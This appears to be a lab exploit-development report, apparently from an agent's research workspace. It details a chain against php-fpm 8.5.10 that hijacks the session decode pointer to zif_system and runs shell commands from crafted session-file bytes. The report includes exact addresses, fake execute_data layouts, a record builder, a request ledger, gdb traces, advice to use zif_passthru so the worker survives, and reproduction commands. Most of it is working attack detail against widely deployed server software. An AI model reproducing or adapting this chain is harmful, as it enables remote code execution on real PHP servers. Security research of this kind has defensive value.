# G6 — `zif_system` as the php-fpm 8.5.10 session `decode` target

**Verdict:** `ps_serializers[2].decode` can be redirected to `zif_system`, and the
`execute_data` pointer that `php_session_decode()` passes (the raw session-file
buffer, i.e. `ZSTR_VAL(data)`) can be shaped from file bytes so that
`php_exec_ex()` parses one string argument and **executes the command**.
The command runs (marker created), but the worker **always** takes SIGSEGV at
the end of `php_exec()` because the same buffer length is also passed as
`return_value`; `RETVAL_EMPTY_STRING()`/`RETVAL_STRINGL()` then writes to a
non-canonical address. There is **no parameterless way to avoid this crash for
`zif_system`**. A `zif_passthru` control through the identical chain survives
the request and returns HTTP 200.

- Date: 2026-10-21 22:24 UTC → 2026-10-22 00:29 UTC (local 00:24–00:29 +0200)
- Lab receipt dir: `/tmp/opencode/research/g6zif_20261021T222434Z`
- Target: `/home/davide/ailocal/php/zerodays_1020/build_plainpie/sapi/fpm/php-fpm`
  (PHP 8.5.10, plain PIE build; `build_plain` sources used for symbols)
- Private instance only: FPM master **1248865**, worker **1249787**,
  `127.0.0.1:28872`, ASLR disabled via `setarch -R`.
  G5 fixedeval instance 1244614 and the shared services 4052217/4052937/4053032/4054145
  were never touched.
- Request budget: 7 of 24 used (`req/count.txt`).

---

## 1. Why this works (call path)

`php_session_initialize()` reads the session file into a `zend_string` `val` and calls

```c
// ext/session/session.c:294
if (PS(serializer)->decode(ZSTR_VAL(data), ZSTR_LEN(data)) == FAILURE) { ... }
```

The session serializer is `php_binary` (`session.serialize_handler=php_binary`), so
`ps_serializers[2]` is the `php_binary` entry. The redirect is the G2 stale-bucket
write into `ps_serializers[2].decode` (`0x14c1b60`).

Because `decode` is called with `(val, len)` but `zif_system` has the internal-function
signature `(zend_execute_data *execute_data, zval *return_value)`, the two registers map as:

| decode actual arg | zif_system formal | value in the successful run |
|---|---|---|
| `ZSTR_VAL(data)` | `execute_data` | `0x7ffff7aae018` |
| `ZSTR_LEN(data)` | `return_value`   | `0x200f1` (131313) |

Therefore the "execute_data" is simply the session-file byte buffer. Everything the
engine reads is attacker-controlled file content. The **only** unavoidable problem is
the second register: if `zif_system` reaches `php_exec()`'s return-value write, it
dereferences `0x200f1` and the worker dies.

Full backtrace (`phase/final_gdb.txt:59-77`):

```
#0 php_exec (type=1, cmd="touch .../FPM_ZIF", array=0x0, return_value=0x200f1) exec.c:171
#1 php_exec_ex (execute_data=..., return_value=0x200f1, mode=1)               exec.c:221
#2 zif_system                                                                exec.c:251
#3 php_session_decode (data=0x7ffff7aae000)                                  session.c:294
#4 php_session_initialize                                                    session.c:514
#5 php_session_rfc1867_update (progress=..., force_update=true)              session.c:3147
#6 php_session_rfc1867_callback                                              session.c:3331
#7 rfc1867_post_handler                                                      rfc1867.c:1273
```

---

## 2. Chain reuse (G2) and geometry

G2's stale `BG(unserialize)` bucket chain is reused unchanged; only the
**value written** (K) and the fake structures inside the session payload are
recomputed for this target. Reference: `/tmp/opencode/research/fpmgadget_20261021T211940Z/README.md`.

Plant step `n=4` (`www/unser.php`, duplicate array key + `E_USER_ERROR` in the error
handler) leaves the stale bucket state in the worker. The `n=5` request then parses
the crafted `sess_g6f`, and the stale chain lands one 16-byte bucket-zval write at
`B0 + 0x10`:

```
K = (A_target - (B0 + 0x10)) / 16 = (0x14c1b60 - 0x7ffff7a84010) / 16 = -8796082913867
```

Verified pre-state after the plant (`phase/plant3_state.txt`):

```
BG level=1 data=0x7ffff7a81000
last=0x7ffff7a81038 first_dtor=0x7ffff7a84000 last_dtor=0x7ffff7a84000
entries.used=3
dtor used=1
```

| symbol | address |
|---|---|
| `ps_serializers[2].encode` (`0x14c1b58`) | `0x83dd97` (untouched) |
| `ps_serializers[2].decode` (`0x14c1b60`) | **`0x88f6a7` = `zif_system`** |
| `zif_passthru` (control) | `0x88f6b7` |

`phase/final_gdb.txt:32-35` shows the post-write state at the second decode:

```
DECODE hit=2 ... ser2decode=0x88f6a7
0x14c1b60 <ps_serializers+64>: 0x000000000088f6a7
```

---

## 3. Fake `execute_data` layout (relative to S = `ZSTR_VAL` = file offset 0)

The whole decoded buffer maps linearly to file offsets (file offset *n* → `S+n`).
`S = 0x7ffff7aae018`, so `0x7ffff7aae018 + n` = file byte *n*.

| offset | value | meaning (as read by `php_exec_ex`) |
|---|---|---|
| `S+0x18` | `F = 0x7ffff7aae18f` | `zend_string *cmd` (argument 1) |
| `S+0x2c` | `1` (u32) | `ZEND_CALL_NUM_ARGS` |
| `S+0x50` | `F` | `ZEND_CALL_ARG(1)` zval value (ptr) |
| `S+0x58` | `6` (u32) | zval type `IS_STRING` |
| `F+0x10` | `59` (u64) | `ZSTR_LEN(cmd)` |
| `F+0x18` | `"touch .../FPM_ZIF"` | `ZSTR_VAL(cmd)`, NUL-terminated |

All of these bytes are **key material of record 1** except `F`'s target, which is
inside record 2's string payload (see §4). `func`/`arg_info` at `S+0x18`… are not
consulted by `zif_system` → `php_exec_ex`; the slot is simply reused as the command
pointer (`phase/final_gdb.txt:52-56`).

`php_exec_ex` parse requirement actually observed (and all that is required):

```
PHP_EXEC_EX rdi=0x7ffff7aae018 rsi=0x200f1 rdx=0x1 numargs=1 arg1val=0x7ffff7aae18f arg1type=6
F=0x7ffff7aae18f F+0x10(len)=59
```

i.e. `num_args==1`, arg type `IS_STRING`, `F` readable, `F+0x10 == strlen(F+0x18)`,
length non-zero, no embedded NUL. No hash table, no `func`, no `arg_info`, no
`ZEND_ACC_*` flags are needed.

---

## 4. Session-file geometry (why the offsets are what they are)

`php_binary` writes: `name_len` byte, name bytes, then the serialized value.
The round trip is:

1. Request `n=5` uploads a file with `PHPSESSID=g6f`. `rfc1867_post_handler` calls
   `php_session_rfc1867_update(force=true)` → `php_session_initialize()` →
   **decode #1** of the planted file (`T1 = 131014` bytes). During this decode the
   stale G2 chain writes `K` into `ps_serializers[2].decode`.
2. The same update merges the upload-progress array into `$_SESSION` and calls
   `php_session_flush(1)` → `php_binary` **encode** → re-encoded in-memory buffer
   `T2 = T1 + 299 = 131313` bytes, written to `sessions/sess_g6f`.
3. A subsequent `php_session_rfc1867_update` re-initializes the session →
   **decode #2** of the 131313-byte buffer, now through `zif_system`.

Planted file (`scripts/mkrec_g6.py`):

```
record 1: [0x60][96-byte key1]['i:8976039;']            = 107 bytes
record 2: [0x01]['z']['s:130893:"'] + payload + ['";']  = 130907 bytes
total                                                    = 131014
```

- `0x60 = 96` = `name_len` of a binary session key. The encoder writes it back
  verbatim, so file offsets `0x18/0x2c/0x50/0x58` of the **re-encoded** buffer are
  key1 bytes. That is why the key is 96 bytes and why the fake `execute_data` lives
  in a key (offsets inside key1 = file offset − 1).
- Record 2's payload starts at file offset `Q = 0x77`; `F` is placed at
  `Q + 0x100 = 0x177` (`0x7ffff7aae18f` after decode), the length field at
  `0x187` and the command at `0x18f`. This keeps `cmd` inside a legitimate string
  value, so it survives the round trip byte-for-byte.
- `X1 = 0x7ffff7a6a000` (decode #1 buffer) and `X2 = 0x7ffff7aae000` (decode #2
  buffer) are deterministic for this content/request shape with ASLR off; `X2` was
  calibrated first with a `K=0` build (identical lengths/allocation history) and then
  the final `K` build was run. `phase/mkrec_final.json` records both.

The calibration run (`n=3`, label `g6c`) proves the geometry with the real decode
pointer: hit1 len `131014`, hit2 len `131313`, bytes at `0x2c/0x50/0x58` exactly as
designed (`phase/calib_gdb.txt`).

---

## 5. Request ledger

| n | kind | label | result |
|---|---|---|---|
| 1 | probe | liveness | HTTP 200, `PID=1248866` |
| 2 | plant | user_error | `PID=1248866`, fatal `stop` (chain armed) |
| 3 | calib | g6c | connection reset; hit1 + hit2 with **real** decode, len 131014/131313 |
| 4 | plant | user_error | `PID=1249305`, fatal `stop` (chain armed in the surviving worker) |
| 5 | trigger | g6f | connection reset; **`zif_system` hit, command executed, SIGSEGV** |
| 6 | plant | user_error | `PID=1249787` (respawned worker), fatal `stop` |
| 7 | trigger | g6p | HTTP 200 `PID=1249787`; **`zif_passthru` control survives** |

`req/requests.log`, `req/count.txt=7`, per-request `req/NN_*/meta.json`.

---

## 6. Decisive evidence — `zif_system`

`phase/final_gdb.txt`:

```
DECODE hit=2 str=0x7ffff7aae000 val=0x7ffff7aae018 len=131313 level=1
  data=0x7ffff7a81000 ser2decode=0x88f6a7 ser2encode=0x83dd97
ZIF_SYSTEM hit rdi=0x7ffff7aae018 rsi=0x200f1 rdx=0x39a8dcb1866b3216
PHP_EXEC_EX rdi=0x7ffff7aae018 rsi=0x200f1 rdx=0x1 numargs=1
  arg1val=0x7ffff7aae18f arg1type=6
F=0x7ffff7aae18f F+0x10(len)=59
0x7ffff7aae1a7: "touch /tmp/opencode/research/g6zif_20261021T222434Z/FPM_ZIF"
PHP_EXEC type=1 cmd=0x7ffff7aae1a7 array=(nil) retval=0x200f1
[Detaching after vfork from child process 1249785]

Program received signal SIGSEGV
0x88f3e1 in php_exec (...) exec.c:171
171     RETVAL_EMPTY_STRING();
```

Register state at the fault:

```
rip 0x88f3e1 <php_exec+450>   mov %rax,(%rcx)
rcx 0x200f1 (= ZSTR_LEN(data), the bogus return_value)
rax 0x40200258
```

- The command ran: `FPM_ZIF` created **2026-10-22 00:28:47.905688124 +0200, inode 2678894**
  (`phase/marker_zif_system.txt`; byte copy in `phase/marker_zif_system_file`).
- Worker 1249305 died (`log/fpm-error.log`): `child 1249305 exited on signal 11 (SIGSEGV)`;
  master respawned 1249787.
- HTTP side: `ConnectionResetError` (`phase/final_req.json`, 0.038 s).

**Crash analysis:** `php_exec()` with `type=1` (`system`) always writes a return zval.
With output it reaches `RETVAL_STRINGL(buf,bufl)` (exec.c:170); with no output it reaches
`RETVAL_EMPTY_STRING()` (exec.c:171). Both store through `return_value`, which here is
the integer `131313`, so the SIGSEGV is unconditional and independent of the command's
output. The command itself has already executed via `popen`/`vfork` before the store.

## 7. Survival control — `zif_passthru`

`phase/passthru_gdb.txt`, same chain, same records, target `0x88f6b7`:

```
DECODE hit=2 ... ser2decode=0x88f6b7
ZIF_PASSTHRU hit rdi=0x7ffff7aae018 rsi=0x200f1
PHP_EXEC_EX ... rdx=0x3 numargs=1 arg1val=0x7ffff7aae18f arg1type=6
PHP_EXEC type=3 cmd=0x7ffff7aae1a7 array=(nil) retval=0x200f1
[Detaching after vfork from child process 1249980]
AFTER_PHP_EXEC eax=0
```

`type=3` takes the `php_stream_read`/`PHPWRITE` branch and never dereferences
`return_value` → no fault. Result: HTTP 200 `PID=1249787`, worker alive
(`phase/passthru_req.json`), marker re-created **00:29:25.817351108, inode 2678909**
(`phase/marker_passthru.txt`). `FPM_ZIF` on disk is the passthru marker; the
`zif_system` marker was preserved beforehand as `phase/marker_zif_system_file`.

This isolates the fault to the `return_value` write and proves the rest of the
chain (parse, `popen`, command execution, worker bookkeeping) is sound.

---

## 8. Conclusions

1. **`zif_system` is a valid `php_binary` `decode` target**: the buffer passed as
   `execute_data` can be shaped entirely from session-file bytes; `php_exec_ex`
   accepts it and executes the command.
2. **The write primitive is single-shot per plant** and lands exactly at
   `ps_serializers[2].decode`; the `encode` pointer is untouched, so the flush that
   produces the second buffer still works.
3. **Crash is unavoidable for `zif_system`**: `return_value = ZSTR_LEN(data)` is a
   small integer, and `php_exec` always stores a zval through it. The command runs,
   then the worker dies with SIGSEGV at `php_exec+450` (`mov %rax,(%rcx)`),
   `RETVAL_EMPTY_STRING()` at exec.c:171 for a silent command, `RETVAL_STRINGL` at
   exec.c:170 for a chatty one.
4. **`zif_passthru` survives** the identical chain because `type=3` never writes
   `return_value`; it is the correct choice when post-execution worker survival matters
   and return values are not needed.
5. Exact parse requirements: `num_args==1` at `S+0x2c`, arg zval `IS_STRING` at
   `S+0x58`, string pointer at `S+0x50`, `F+0x10 == strlen(F+0x18)`, non-empty,
   NUL-free. Nothing else in the fake `zend_execute_data`/`zend_function` is read.

---

## 9. Artifact index

| path | content |
|---|---|
| `phase/final_gdb.txt` | decisive `zif_system` run: hit1/hit2, frames, SIGSEGV, registers |
| `phase/final_req.json` | trigger #5 result (connection reset) |
| `phase/passthru_gdb.txt` | surviving `zif_passthru` control |
| `phase/passthru_req.json` | HTTP 200 `PID=1249787` |
| `phase/calib_gdb.txt`, `phase/calib_req.json` | K=0 geometry calibration (n=3) |
| `phase/plant1_state.txt`, `phase/plant2_state.txt`, `phase/plant3_state.txt` | `BG(unserialize)`/dtor pre-state after each plant |
| `phase/mkrec_final.json`, `phase/mkrec_passthru.json`, `phase/mkrec_calib.json` | exact record offsets, `P`, `B0`, `K`, `F` |
| `phase/marker_zif_system.txt`, `phase/marker_zif_system_file` | `zif_system` marker stat + byte copy |
| `phase/marker_passthru.txt` | passthru marker stat |
| `scripts/mkrec_g6.py` | record builder (`--mode calib|final`, `--target`) |
| `scripts/drv.py`, `scripts/fcgi.py`, `scripts/rungdb.sh` | request driver / FastCGI client / gdb attach |
| `gdb/final.gdb`, `gdb/passthru.gdb`, `gdb/calib.gdb`, `gdb/state.gdb` | breakpoint scripts |
| `conf/fpm.conf`, `start.sh` | private pool config (port 28872) and launcher |
| `req/` | per-request metadata + `requests.log` |
| `log/` | FPM master/child logs (SIGSEGV records) |

Reference receipts: `/tmp/opencode/research/fpmgadget_20261021T211940Z/README.md` (G2
stale-chain write), `/tmp/opencode/research/gadget_20261021T210031Z/README.md`
(G1 fake `execute_data`).

## 10. Reproduction sketch

```bash
LAB=/tmp/opencode/research/g6zif_20261021T222434Z
# 1. start private FPM with ASLR off, port 28872
"$LAB/start.sh"
# 2. build the planted session (T1=131014) for the known X1/X2/P/B0
python3 "$LAB/scripts/mkrec_g6.py" --out "$LAB/sessions/sess_g6f" \
  --x1 0x7ffff7a6a000 --x2 0x7ffff7aae000 \
  --p 0x7ffff7a81000 --b0 0x7ffff7a84000 --total 131014 --mode final \
  --target 0x88f6a7 --meta "$LAB/phase/mkrec_final.json"
# 3. plant the stale chain (unser.php duplicate-key + E_USER_ERROR)
python3 "$LAB/scripts/drv.py" plant user_error
# 4. attach gdb to the worker with gdb/final.gdb, then trigger once
python3 "$LAB/scripts/drv.py" trigger g6f
```
